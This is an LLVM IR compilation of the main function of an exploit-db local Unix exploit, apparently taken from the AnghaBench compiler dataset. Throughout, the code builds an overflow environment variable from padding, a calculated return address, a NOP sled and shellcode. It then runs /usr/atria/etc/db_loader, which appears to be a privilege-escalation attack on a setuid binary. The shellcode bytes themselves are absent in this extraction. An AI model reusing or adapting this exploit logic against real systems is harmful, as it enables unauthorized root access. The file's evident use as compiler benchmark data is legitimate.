; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21150.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21150.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellCode = common dso_local global i8* null, align 8
@ENV_VAR = common dso_local global i8* null, align 8
@RET_DIS = common dso_local global i32 0, align 4
@NNOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"=\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"Jumping to 0x%.8x\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"/usr/atria/etc/db_loader\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"xfocus\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"No more free memory!\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [256 x i8], align 16
  %7 = alloca i32*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = bitcast [256 x i8]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %19, i8 0, i64 256, i1 false)
  store i32* null, i32** %7, align 8
  store i8* null, i8** %8, align 8
  store i8* null, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %20 = load i8*, i8** @shellCode, align 8
  %21 = call i32 @strlen(i8* %20)
  store i32 %21, i32* %18, align 4
  %22 = load i32, i32* %4, align 4
  %23 = icmp eq i32 %22, 2
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  store i32 %28, i32* %13, align 4
  br label %29

29:                                               ; preds = %24, %2
  %30 = load i8*, i8** @ENV_VAR, align 8
  %31 = call i32 @strlen(i8* %30)
  %32 = load i32, i32* @RET_DIS, align 4
  %33 = add nsw i32 %31, %32
  %34 = load i32, i32* @NNOP, align 4
  %35 = add nsw i32 %33, %34
  %36 = load i32, i32* %18, align 4
  %37 = add nsw i32 %35, %36
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %12, align 4
  %39 = load i8*, i8** @ENV_VAR, align 8
  %40 = call i8* @getenv(i8* %39)
  store i8* %40, i8** %9, align 8
  %41 = load i8*, i8** %9, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %14, align 4
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 4
  store i32 %45, i32* %15, align 4
  %46 = load i32, i32* %15, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %54

48:                                               ; preds = %29
  %49 = load i32, i32* %15, align 4
  %50 = sub nsw i32 4, %49
  store i32 %50, i32* %15, align 4
  %51 = load i32, i32* %15, align 4
  %52 = load i32, i32* %14, align 4
  %53 = add nsw i32 %52, %51
  store i32 %53, i32* %14, align 4
  br label %54

54:                                               ; preds = %48, %29
  %55 = load i32, i32* %12, align 4
  %56 = srem i32 %55, 4
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %65

59:                                               ; preds = %54
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 4, %60
  store i32 %61, i32* %15, align 4
  %62 = load i32, i32* %15, align 4
  %63 = load i32, i32* %12, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %12, align 4
  br label %65

65:                                               ; preds = %59, %54
  %66 = load i8*, i8** @ENV_VAR, align 8
  %67 = call i32 @getEnvAddr(i8* %66)
  store i32 %67, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = load i32, i32* %14, align 4
  %70 = sub nsw i32 %68, %69
  store i32 %70, i32* %16, align 4
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %16, align 4
  %73 = sub nsw i32 %71, %72
  %74 = load i8*, i8** @ENV_VAR, align 8
  %75 = call i32 @strlen(i8* %74)
  %76 = add nsw i32 %73, %75
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %10, align 4
  %78 = load i32, i32* %10, align 4
  %79 = srem i32 %78, 4
  store i32 %79, i32* %15, align 4
  %80 = load i32, i32* %15, align 4
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %82, label %85

82:                                               ; preds = %65
  %83 = load i32, i32* %15, align 4
  %84 = sub nsw i32 4, %83
  store i32 %84, i32* %15, align 4
  br label %85

85:                                               ; preds = %82, %65
  %86 = load i32, i32* @RET_DIS, align 4
  %87 = load i32, i32* %15, align 4
  %88 = add nsw i32 %86, %87
  %89 = load i32, i32* %13, align 4
  %90 = add nsw i32 %88, %89
  %91 = load i32, i32* %10, align 4
  %92 = add nsw i32 %91, %90
  store i32 %92, i32* %10, align 4
  %93 = load i32, i32* %12, align 4
  %94 = call i64 @malloc(i32 %93)
  %95 = inttoptr i64 %94 to i8*
  store i8* %95, i8** %8, align 8
  %96 = load i8*, i8** %8, align 8
  %97 = icmp ne i8* %96, null
  br i1 %97, label %98, label %165

98:                                               ; preds = %85
  %99 = load i8*, i8** %8, align 8
  %100 = load i8*, i8** @ENV_VAR, align 8
  %101 = call i32 @strcpy(i8* %99, i8* %100)
  %102 = load i8*, i8** %8, align 8
  %103 = call i32 @strcat(i8* %102, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %104 = load i8*, i8** %8, align 8
  %105 = load i8*, i8** %8, align 8
  %106 = call i32 @strlen(i8* %105)
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %104, i64 %107
  store i8* %108, i8** %9, align 8
  %109 = load i8*, i8** %9, align 8
  %110 = load i32, i32* %12, align 4
  %111 = load i8*, i8** %8, align 8
  %112 = call i32 @strlen(i8* %111)
  %113 = sub nsw i32 %110, %112
  %114 = sub nsw i32 %113, 4
  %115 = call i32 @memset(i8* %109, i32 65, i32 %114)
  %116 = load i8*, i8** %9, align 8
  %117 = load i32, i32* @RET_DIS, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = bitcast i8* %119 to i32*
  store i32* %120, i32** %7, align 8
  %121 = load i32, i32* %10, align 4
  %122 = load i32*, i32** %7, align 8
  %123 = getelementptr inbounds i32, i32* %122, i32 1
  store i32* %123, i32** %7, align 8
  store i32 %121, i32* %122, align 4
  %124 = load i32*, i32** %7, align 8
  %125 = bitcast i32* %124 to i8*
  store i8* %125, i8** %9, align 8
  %126 = load i32, i32* %15, align 4
  %127 = load i8*, i8** %9, align 8
  %128 = sext i32 %126 to i64
  %129 = getelementptr inbounds i8, i8* %127, i64 %128
  store i8* %129, i8** %9, align 8
  store i32 0, i32* %17, align 4
  br label %130

130:                                              ; preds = %139, %98
  %131 = load i32, i32* %17, align 4
  %132 = load i32, i32* @NNOP, align 4
  %133 = icmp slt i32 %131, %132
  br i1 %133, label %134, label %142

134:                                              ; preds = %130
  %135 = load i32, i32* @NOP, align 4
  %136 = trunc i32 %135 to i8
  %137 = load i8*, i8** %9, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %9, align 8
  store i8 %136, i8* %137, align 1
  br label %139

139:                                              ; preds = %134
  %140 = load i32, i32* %17, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %17, align 4
  br label %130

142:                                              ; preds = %130
  store i32 0, i32* %17, align 4
  br label %143

143:                                              ; preds = %155, %142
  %144 = load i32, i32* %17, align 4
  %145 = load i32, i32* %18, align 4
  %146 = icmp slt i32 %144, %145
  br i1 %146, label %147, label %158

147:                                              ; preds = %143
  %148 = load i8*, i8** @shellCode, align 8
  %149 = load i32, i32* %17, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %148, i64 %150
  %152 = load i8, i8* %151, align 1
  %153 = load i8*, i8** %9, align 8
  %154 = getelementptr inbounds i8, i8* %153, i32 1
  store i8* %154, i8** %9, align 8
  store i8 %152, i8* %153, align 1
  br label %155

155:                                              ; preds = %147
  %156 = load i32, i32* %17, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %17, align 4
  br label %143

158:                                              ; preds = %143
  %159 = load i8*, i8** %9, align 8
  store i8 0, i8* %159, align 1
  %160 = load i8*, i8** %8, align 8
  %161 = call i32 @putenv(i8* %160)
  %162 = load i32, i32* %10, align 4
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 %162)
  %164 = call i32 @execl(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32* null)
  br label %167

165:                                              ; preds = %85
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  br label %167

167:                                              ; preds = %165, %158
  %168 = load i32, i32* %3, align 4
  ret i32 %168
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @getEnvAddr(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
